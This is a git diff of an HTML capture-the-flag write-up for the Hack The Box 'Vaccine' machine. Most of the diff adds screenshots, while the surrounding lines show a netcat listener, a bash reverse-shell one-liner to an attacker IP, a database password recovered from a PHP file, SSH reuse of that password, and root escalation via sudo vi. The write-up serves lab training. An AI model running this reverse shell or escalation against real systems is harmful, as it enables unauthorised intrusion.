@@ -472,17 +472,25 @@ On Kali, we start the listener:
 
 <pre>nc -lvnp 443</pre>
 
+<img src="https://github.com/3stefani/HTB-writeups/blob/main/Vaccine/img/18_listener_on_port_443.png" alt="Listener on port 443">
+
+
 <p>
 Then, from the <code>os-shell</code>, we execute:
 </p>
 
 <pre>bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.39/443 0&gt;&amp;1"</pre>
 
+<img src="https://github.com/3stefani/HTB-writeups/blob/main/Vaccine/img/19_command_on_os_shell.png" alt="Command in os-shell">
+
 <p>
 The connection provides us with a shell as:
 </p>
 
 <pre>postgres@vaccine:/var/lib/postgresql/11/main$</pre>
+
+<img src="https://github.com/3stefani/HTB-writeups/blob/main/Vaccine/img/20_we_get_a_reverse_shell.png" alt="We obtain the reverse shell.">
+
 
 <p>
 The initial reverse shell does not provide a fully interactive TTY, so some operations,
@@ -505,6 +513,10 @@ by the application to connect to PostgreSQL:
 
 <pre>$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");</pre>
 
+<img src="https://github.com/3stefani/HTB-writeups/blob/main/Vaccine/img/21_find_the_pass_on_file.png" alt="We found the dashboard.php file, where the password is located.">
+
+<img src="https://github.com/3stefani/HTB-writeups/blob/main/Vaccine/img/22_pass_in_file.png" alt="The file contains the password.">
+
 <p>
 Recovered credentials:
 </p>
@@ -520,7 +532,13 @@ We use the credentials to connect directly via SSH:
 </p>
 
 <pre>ssh postgres@10.129.x.x</pre>
+<img src="https://github.com/3stefani/HTB-writeups/blob/main/Vaccine/img/23_connection_via_ssh.png" alt="We connect via SSH using the password found.">
 
+<p>
+We found that the program that the postgres user can run as root using sudo is vi.
+</p>
+
+<img src="https://github.com/3stefani/HTB-writeups/blob/main/Vaccine/img/24_found_vi.png" alt="Vi is the program that the postgres user can execute as root using sudo.">
 <p>
 Once authenticated, we check the contents of the home directory:
 </p>
@@ -538,6 +556,7 @@ The user flag is obtained with:
 </p>
 
 <pre>cat user.txt</pre>
+<img src="https://github.com/3stefani/HTB-writeups/blob/main/Vaccine/img/25_found_user_flag.png" alt="We found the user flag.">
 
 <p>
 ✅ <strong>User flag obtained.</strong>
@@ -623,6 +642,8 @@ We can also observe the prompt:
 This confirms that privilege escalation was successful.
 </p>
 
+<img src="https://github.com/3stefani/HTB-writeups/blob/main/Vaccine/img/26_found_root_flag.png" alt="Escalation of privileges through vi">
+
 <hr />
 
 <h2>Obtaining the Root Flag</h2>
@@ -648,6 +669,10 @@ Finally, we read:
 <p>
 ✅ <strong>Root flag successfully obtained.</strong>
 </p>
+
+<img src="https://github.com/3stefani/HTB-writeups/blob/main/Vaccine/img/27_get_root_flag.png" alt="We obtain the root flag.">
+
+<img src="https://github.com/3stefani/HTB-writeups/blob/main/Vaccine/img/28_htb_vaccine_solved.png" alt="Hack The Box "Vaccine" machine solved">
 
 <hr />
 
